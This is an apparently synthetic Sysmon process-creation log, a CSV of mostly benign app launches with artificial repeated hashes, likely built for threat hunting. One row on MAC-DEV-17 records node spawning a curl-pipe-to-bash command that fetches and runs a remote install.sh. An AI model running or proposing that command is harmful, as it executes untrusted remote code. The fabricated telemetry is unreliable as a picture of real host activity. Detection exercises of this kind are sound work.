UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-13 13:04:27.201,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00049c7717d662e500049c7717d662e500049c7717d662e500049c7717d662e5
2026-03-13 13:17:02.175,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=000b5c7c0b8a4242000b5c7c0b8a4242000b5c7c0b8a4242000b5c7c0b8a4242
2026-03-13 13:29:23.998,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0011b50f0a4c14b20011b50f0a4c14b20011b50f0a4c14b20011b50f0a4c14b2
2026-03-13 13:39:34.629,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003a818259c7aef0003a818259c7aef0003a818259c7aef0003a818259c7aef
2026-03-13 13:53:26.032,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0000a21737054e8e0000a21737054e8e0000a21737054e8e0000a21737054e8e
2026-03-13 14:02:25.310,MAC-DEV-17,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000db671be720ebc000db671be720ebc000db671be720ebc000db671be720ebc
2026-03-13 14:09:18.869,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001b58eb33f91bd4001b58eb33f91bd4001b58eb33f91bd4001b58eb33f91bd4
2026-03-13 14:19:30.260,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000fd01fa8de67d1000fd01fa8de67d1000fd01fa8de67d1000fd01fa8de67d1
2026-03-13 14:28:27.908,MAC-DEV-17,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000842d065e59bf3000842d065e59bf3000842d065e59bf3000842d065e59bf3
2026-03-13 14:31:39.640,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0011092b658f81800011092b658f81800011092b658f81800011092b658f8180
2026-03-13 14:35:08.009,FIN-WS31,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b7879cdc20d79001b7879cdc20d79001b7879cdc20d79001b7879cdc20d79
2026-03-13 14:38:48.181,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00075d025c8376de00075d025c8376de00075d025c8376de00075d025c8376de
2026-03-13 14:53:12.089,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022952f2c22481a0022952f2c22481a0022952f2c22481a0022952f2c22481a
2026-03-13 15:04:17.002,FIN-WS22,n.byrd,1,git,"git",explorer.exe,,,SHA256=0008c90c1e3db56f0008c90c1e3db56f0008c90c1e3db56f0008c90c1e3db56f
2026-03-13 15:18:16.671,BLD-RUN-02,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008ec067338fa730008ec067338fa730008ec067338fa730008ec067338fa73
2026-03-13 15:26:33.580,BLD-RUN-02,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015414ab12fc94e0015414ab12fc94e0015414ab12fc94e0015414ab12fc94e
2026-03-13 15:31:49.447,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001f2070b34a1220001f2070b34a1220001f2070b34a1220001f2070b34a1220
2026-03-13 15:46:15.994,FIN-WS22,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001093dbd563597f001093dbd563597f001093dbd563597f001093dbd563597f
2026-03-13 15:52:03.984,MAC-DEV-04,t.owens,1,git,"git",explorer.exe,,,SHA256=00042644379a494f00042644379a494f00042644379a494f00042644379a494f
2026-03-13 16:00:53.029,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000cf86e16b0c646000cf86e16b0c646000cf86e16b0c646000cf86e16b0c646
2026-03-13 16:10:53.463,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0010a7ebb17a7b0b0010a7ebb17a7b0b0010a7ebb17a7b0b0010a7ebb17a7b0b
2026-03-13 16:24:42.003,FIN-WS31,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0003f8742d6540be0003f8742d6540be0003f8742d6540be0003f8742d6540be
2026-03-13 16:27:52.617,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001b099fca3227c4001b099fca3227c4001b099fca3227c4001b099fca3227c4
2026-03-13 16:35:30.090,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00209f6672d1f20000209f6672d1f20000209f6672d1f20000209f6672d1f200
2026-03-13 16:49:38.467,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=00229302384c0de000229302384c0de000229302384c0de000229302384c0de0
2026-03-13 16:58:41.114,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00110cd86388319b00110cd86388319b00110cd86388319b00110cd86388319b
2026-03-13 17:10:49.902,FIN-WS22,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001fed32079bf668001fed32079bf668001fed32079bf668001fed32079bf668
2026-03-13 17:20:07.141,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001832ce8264ae2e001832ce8264ae2e001832ce8264ae2e001832ce8264ae2e
2026-03-13 17:32:57.314,FIN-WS22,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=002018a7222563f8002018a7222563f8002018a7222563f8002018a7222563f8
2026-03-13 17:47:21.342,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0012628b506918620012628b506918620012628b506918620012628b50691862
2026-03-13 17:53:50.100,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00012cb537d9c2a700012cb537d9c2a700012cb537d9c2a700012cb537d9c2a7
2026-03-13 18:05:34.374,FIN-WS22,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0020fb2f24c0279a0020fb2f24c0279a0020fb2f24c0279a0020fb2f24c0279a
2026-03-13 18:19:25.679,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0005e7df8251998d0005e7df8251998d0005e7df8251998d0005e7df8251998d
2026-03-13 18:33:09.629,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=001a2ff3a3040107001a2ff3a3040107001a2ff3a3040107001a2ff3a3040107
2026-03-13 18:45:02.522,BLD-RUN-02,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ecffac6eb22f6001ecffac6eb22f6001ecffac6eb22f6001ecffac6eb22f6
2026-03-13 18:52:01.898,BLD-RUN-02,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016594a8901f5100016594a8901f5100016594a8901f5100016594a8901f510
2026-03-13 19:03:15.158,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0015d681ed5226990015d681ed5226990015d681ed5226990015d681ed522699
2026-03-13 19:07:48.040,MAC-DEV-17,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000d021aa9d17c26000d021aa9d17c26000d021aa9d17c26000d021aa9d17c26
2026-03-13 19:12:05.169,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008808863730946000880886373094600088088637309460008808863730946
2026-03-13 19:21:45.887,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000229b525f22b7e000229b525f22b7e000229b525f22b7e000229b525f22b7e
2026-03-13 19:34:52.373,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000938c588dc4fe2000938c588dc4fe2000938c588dc4fe2000938c588dc4fe2
2026-03-13 19:41:27.592,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=0015ee52d28e53490015ee52d28e53490015ee52d28e53490015ee52d28e5349
2026-03-13 19:54:38.585,MAC-DEV-17,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e9078d0575fb6000e9078d0575fb6000e9078d0575fb6000e9078d0575fb6
2026-03-13 20:09:14.702,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00077388997ceb5b00077388997ceb5b00077388997ceb5b00077388997ceb5b
2026-03-13 20:15:36.252,FIN-WS31,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0014fec50978a4500014fec50978a4500014fec50978a4500014fec50978a450
2026-03-13 20:25:13.161,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0007e17ddbd6b06a0007e17ddbd6b06a0007e17ddbd6b06a0007e17ddbd6b06a
2026-03-13 20:33:09.619,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001bc349e3ed838b001bc349e3ed838b001bc349e3ed838b001bc349e3ed838b
2026-03-13 20:36:35.943,MAC-DEV-17,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007dfedb4f2ab470007dfedb4f2ab470007dfedb4f2ab470007dfedb4f2ab47
2026-03-13 20:43:40.688,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001957464afd3a81001957464afd3a81001957464afd3a81001957464afd3a81
2026-03-13 20:49:47.903,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015e3c2d80d1cbb0015e3c2d80d1cbb0015e3c2d80d1cbb0015e3c2d80d1cbb
2026-03-13 21:01:49.773,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000d514859fcf263000d514859fcf263000d514859fcf263000d514859fcf263
2026-03-13 21:05:40.344,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000efcb3c5f5c3f4000efcb3c5f5c3f4000efcb3c5f5c3f4000efcb3c5f5c3f4
2026-03-13 21:19:24.751,MAC-DEV-04,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008c648c13ba29d0008c648c13ba29d0008c648c13ba29d0008c648c13ba29d
2026-03-13 21:25:00.620,MAC-DEV-17,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000f0144264ffaa4000f0144264ffaa4000f0144264ffaa4000f0144264ffaa4
2026-03-13 21:30:07.829,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0016e332d3e8bda70016e332d3e8bda70016e332d3e8bda70016e332d3e8bda7
2026-03-13 21:33:13.469,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017b0dbec5a01430017b0dbec5a01430017b0dbec5a01430017b0dbec5a0143
2026-03-13 21:39:27.647,BLD-RUN-02,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00071a59324ac06d00071a59324ac06d00071a59324ac06d00071a59324ac06d
2026-03-13 21:53:34.508,MAC-DEV-04,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000406f608195f0c000406f608195f0c000406f608195f0c000406f608195f0c
2026-03-13 21:57:31.433,FIN-WS31,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0010334eddc298410010334eddc298410010334eddc298410010334eddc29841
2026-03-13 22:11:01.130,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00019ae2e53b3cb000019ae2e53b3cb000019ae2e53b3cb000019ae2e53b3cb0
2026-03-13 22:16:20.609,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00094bebb58e01a900094bebb58e01a900094bebb58e01a900094bebb58e01a9
2026-03-13 22:30:10.740,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00001c767f6f6dda00001c767f6f6dda00001c767f6f6dda00001c767f6f6dda
2026-03-13 22:38:07.345,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=000b109454d3928d000b109454d3928d000b109454d3928d000b109454d3928d
2026-03-13 22:51:49.486,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0006d686907c44f10006d686907c44f10006d686907c44f10006d686907c44f1
2026-03-13 22:57:42.917,FIN-WS22,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0007f23f7c54a4900007f23f7c54a4900007f23f7c54a4900007f23f7c54a490
2026-03-13 23:01:55.305,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0021da2317159dbe0021da2317159dbe0021da2317159dbe0021da2317159dbe
2026-03-13 23:16:25.019,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004fd0fc035d8930004fd0fc035d8930004fd0fc035d8930004fd0fc035d893
2026-03-13 23:25:35.735,MAC-DEV-17,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001a283ef54196dc001a283ef54196dc001a283ef54196dc001a283ef54196dc
2026-03-13 23:34:04.216,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001100bcd80f02bd001100bcd80f02bd001100bcd80f02bd001100bcd80f02bd
2026-03-13 23:47:32.548,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000f664c664e872a000f664c664e872a000f664c664e872a000f664c664e872a
2026-03-13 23:59:23.214,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=0008b005b1e406750008b005b1e406750008b005b1e406750008b005b1e40675
2026-03-14 00:13:20.356,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00169c0c0fc4ab8900169c0c0fc4ab8900169c0c0fc4ab8900169c0c0fc4ab89
2026-03-14 00:17:50.340,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001c7d444d0c1437001c7d444d0c1437001c7d444d0c1437001c7d444d0c1437
2026-03-14 00:22:03.842,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001dacde37c622a5001dacde37c622a5001dacde37c622a5001dacde37c622a5
2026-03-14 00:26:34.318,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0007bde95643e7250007bde95643e7250007bde95643e7250007bde95643e725
2026-03-14 00:37:26.830,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=000f82f80379dfb6000f82f80379dfb6000f82f80379dfb6000f82f80379dfb6
2026-03-14 00:51:04.809,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=001edd6bdba59ec8001edd6bdba59ec8001edd6bdba59ec8001edd6bdba59ec8
2026-03-14 00:58:44.840,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0005e00d52bd9a430005e00d52bd9a430005e00d52bd9a430005e00d52bd9a43
2026-03-14 01:07:56.075,FIN-WS22,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0020cf6d51acb15a0020cf6d51acb15a0020cf6d51acb15a0020cf6d51acb15a
2026-03-14 01:18:29.774,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00189c69e873387100189c69e873387100189c69e873387100189c69e8733871
2026-03-14 01:29:13.206,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000770b5a72bc590000770b5a72bc590000770b5a72bc590000770b5a72bc590
2026-03-14 01:37:29.737,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001295e6e183126e001295e6e183126e001295e6e183126e001295e6e183126e
2026-03-14 01:47:35.405,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001e51708acb16c4001e51708acb16c4001e51708acb16c4001e51708acb16c4
2026-03-14 01:55:47.445,MAC-DEV-04,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000351b584e288f1000351b584e288f1000351b584e288f1000351b584e288f1
2026-03-14 02:10:32.612,BLD-RUN-02,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0013c243ec95ecdc0013c243ec95ecdc0013c243ec95ecdc0013c243ec95ecdc
2026-03-14 02:14:05.980,MAC-DEV-04,n.byrd,1,node,"node",explorer.exe,,,SHA256=00235901ed2b0dea00235901ed2b0dea00235901ed2b0dea00235901ed2b0dea
2026-03-14 02:23:43.994,MAC-DEV-17,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0010021ab74bb97d0010021ab74bb97d0010021ab74bb97d0010021ab74bb97d
2026-03-14 02:36:09.513,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=000160e82ed0bdc7000160e82ed0bdc7000160e82ed0bdc7000160e82ed0bdc7
2026-03-14 02:39:23.277,BLD-RUN-02,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001be3fb2a222634001be3fb2a222634001be3fb2a222634001be3fb2a222634
2026-03-14 02:45:57.864,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001e7e2fc3ec5116001e7e2fc3ec5116001e7e2fc3ec5116001e7e2fc3ec5116
2026-03-14 02:59:20.356,FIN-WS22,a.velasquez,1,node,"node",explorer.exe,,,SHA256=0007deb4e308dbc00007deb4e308dbc00007deb4e308dbc00007deb4e308dbc0
2026-03-14 03:10:46.090,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00189cba137a513600189cba137a513600189cba137a513600189cba137a5136
2026-03-14 03:25:14.740,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00202b5f4e9698b200202b5f4e9698b200202b5f4e9698b200202b5f4e9698b2
2026-03-14 03:39:12.456,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000863d5b5086875000863d5b5086875000863d5b5086875000863d5b5086875
2026-03-14 03:46:28.045,FIN-WS22,m.sato,1,git,"git",explorer.exe,,,SHA256=0019705c607e5ddf0019705c607e5ddf0019705c607e5ddf0019705c607e5ddf
2026-03-14 03:54:58.908,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001b84d9870c2cdd001b84d9870c2cdd001b84d9870c2cdd001b84d9870c2cdd
2026-03-14 04:06:13.555,FIN-WS31,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c72d9da699997001c72d9da699997001c72d9da699997001c72d9da699997
2026-03-14 04:19:16.275,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0015098bb56a366e0015098bb56a366e0015098bb56a366e0015098bb56a366e
2026-03-14 04:31:14.705,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0019040df02b5e710019040df02b5e710019040df02b5e710019040df02b5e71
2026-03-14 04:41:30.616,FIN-WS22,r.kapoor,1,git,"git",explorer.exe,,,SHA256=00158132ee9f7c9d00158132ee9f7c9d00158132ee9f7c9d00158132ee9f7c9d
2026-03-14 04:47:34.842,MAC-DEV-04,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017e5b6a3da69210017e5b6a3da69210017e5b6a3da69210017e5b6a3da6921
2026-03-14 04:56:26.182,BLD-RUN-02,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00191fb70dcd2c5200191fb70dcd2c5200191fb70dcd2c5200191fb70dcd2c52
2026-03-14 05:10:51.651,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000481bbe60310ca000481bbe60310ca000481bbe60310ca000481bbe60310ca
2026-03-14 05:20:23.107,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=00063500f43b36b800063500f43b36b800063500f43b36b800063500f43b36b8
2026-03-14 05:24:14.813,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000df9692d6ac799000df9692d6ac799000df9692d6ac799000df9692d6ac799
2026-03-14 05:30:52.888,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0000ffbbcb40129d0000ffbbcb40129d0000ffbbcb40129d0000ffbbcb40129d
2026-03-14 05:42:08.660,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017169c93709db00017169c93709db00017169c93709db00017169c93709db0
2026-03-14 05:50:30.837,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008af544ca25d370008af544ca25d370008af544ca25d370008af544ca25d37
2026-03-14 05:54:36.504,MAC-DEV-17,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0007bb2548ded6aa0007bb2548ded6aa0007bb2548ded6aa0007bb2548ded6aa
2026-03-14 06:03:10.559,FIN-WS31,l.chen,1,git,"git",explorer.exe,,,SHA256=0012cd391bf184810012cd391bf184810012cd391bf184810012cd391bf18481
2026-03-14 06:09:33.670,BLD-RUN-02,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001fe46497662249001fe46497662249001fe46497662249001fe46497662249
2026-03-14 06:18:50.058,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001abf3cd6183c91001abf3cd6183c91001abf3cd6183c91001abf3cd6183c91
2026-03-14 06:26:55.862,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=0013d7d62e13faf90013d7d62e13faf90013d7d62e13faf90013d7d62e13faf9
2026-03-14 06:41:20.911,MAC-DEV-04,t.owens,1,node,"node",explorer.exe,,,SHA256=0010f0663da6829f0010f0663da6829f0010f0663da6829f0010f0663da6829f
2026-03-14 06:52:42.061,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0018bef6bdb021590018bef6bdb021590018bef6bdb021590018bef6bdb02159
2026-03-14 07:06:19.898,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0001520060fd2b880001520060fd2b880001520060fd2b880001520060fd2b88
2026-03-14 07:10:10.396,MAC-DEV-04,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001bb420a871b1f1001bb420a871b1f1001bb420a871b1f1001bb420a871b1f1
2026-03-14 07:16:55.273,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001a36f40886c115001a36f40886c115001a36f40886c115001a36f40886c115
2026-03-14 07:21:35.226,BLD-RUN-02,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020214b799afaac0020214b799afaac0020214b799afaac0020214b799afaac
2026-03-14 07:31:26.253,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0016b16cee9890550016b16cee9890550016b16cee9890550016b16cee989055
2026-03-14 07:43:07.579,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=000760b0e8ea8fdc000760b0e8ea8fdc000760b0e8ea8fdc000760b0e8ea8fdc
2026-03-14 07:55:33.023,BLD-RUN-02,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001298e887ae94bf001298e887ae94bf001298e887ae94bf001298e887ae94bf
2026-03-14 08:08:23.091,FIN-WS22,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00174c4330373ccf00174c4330373ccf00174c4330373ccf00174c4330373ccf
2026-03-14 08:13:58.000,FIN-WS22,e.park,1,C:\Program Files\Google\Chrome\Application\chrome.exe,"chrome.exe https://review-board-portal.com/session/84e2",C:\Windows\explorer.exe,,,SHA256=77009e7fea4910b7cc067dba3daf02d8722756a959f373cf04d0e8f372894cfb
2026-03-14 08:16:34.388,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00191e7f04fa2f0500191e7f04fa2f0500191e7f04fa2f0500191e7f04fa2f05
2026-03-14 08:30:05.172,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=001cfd07676fda39001cfd07676fda39001cfd07676fda39001cfd07676fda39
2026-03-14 08:41:09.856,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00191d7a92cfa3b800191d7a92cfa3b800191d7a92cfa3b800191d7a92cfa3b8
2026-03-14 08:52:20.302,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=00038d81c0ffe50500038d81c0ffe50500038d81c0ffe50500038d81c0ffe505
2026-03-14 09:06:51.222,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000981ab267f0524000981ab267f0524000981ab267f0524000981ab267f0524
2026-03-14 09:17:30.680,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000a304a0d5f724b000a304a0d5f724b000a304a0d5f724b000a304a0d5f724b
2026-03-14 09:21:44.307,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0003d86f9038bd200003d86f9038bd200003d86f9038bd200003d86f9038bd20
2026-03-14 09:27:00.740,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00221f075b85e17800221f075b85e17800221f075b85e17800221f075b85e178
2026-03-14 09:33:13.210,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=001ee989d403369b001ee989d403369b001ee989d403369b001ee989d403369b
2026-03-14 09:36:22.112,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000e3b73358803ef000e3b73358803ef000e3b73358803ef000e3b73358803ef
2026-03-14 09:46:05.983,BLD-RUN-02,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000daaa33b2b7c24000daaa33b2b7c24000daaa33b2b7c24000daaa33b2b7c24
2026-03-14 09:55:10.070,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=001186ce9bf769ad001186ce9bf769ad001186ce9bf769ad001186ce9bf769ad
2026-03-14 10:06:11.000,MAC-DEV-17,r.kapoor,1,/bin/bash,"bash -c curl -fsSL https://cdn-build-linker.com/install.sh | bash",/usr/local/bin/node,,,SHA256=8c117ac5f74747e9013c8f55b4c56bcf1aaf0cb8f151bdf224426817e2f82424
2026-03-14 10:07:30.770,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000d922a2711cfd5000d922a2711cfd5000d922a2711cfd5000d922a2711cfd5
2026-03-14 10:17:07.238,MAC-DEV-04,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00220bdea7d8acb200220bdea7d8acb200220bdea7d8acb200220bdea7d8acb2
2026-03-14 10:30:23.922,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000edef89ef39a3a000edef89ef39a3a000edef89ef39a3a000edef89ef39a3a
2026-03-14 10:40:51.008,BLD-RUN-02,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0017f413dde4013c0017f413dde4013c0017f413dde4013c0017f413dde4013c
2026-03-14 10:48:15.195,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=00218032a963612800218032a963612800218032a963612800218032a9636128
2026-03-14 10:58:33.528,FIN-WS22,e.park,1,node,"node",explorer.exe,,,SHA256=0018793d96348f210018793d96348f210018793d96348f210018793d96348f21
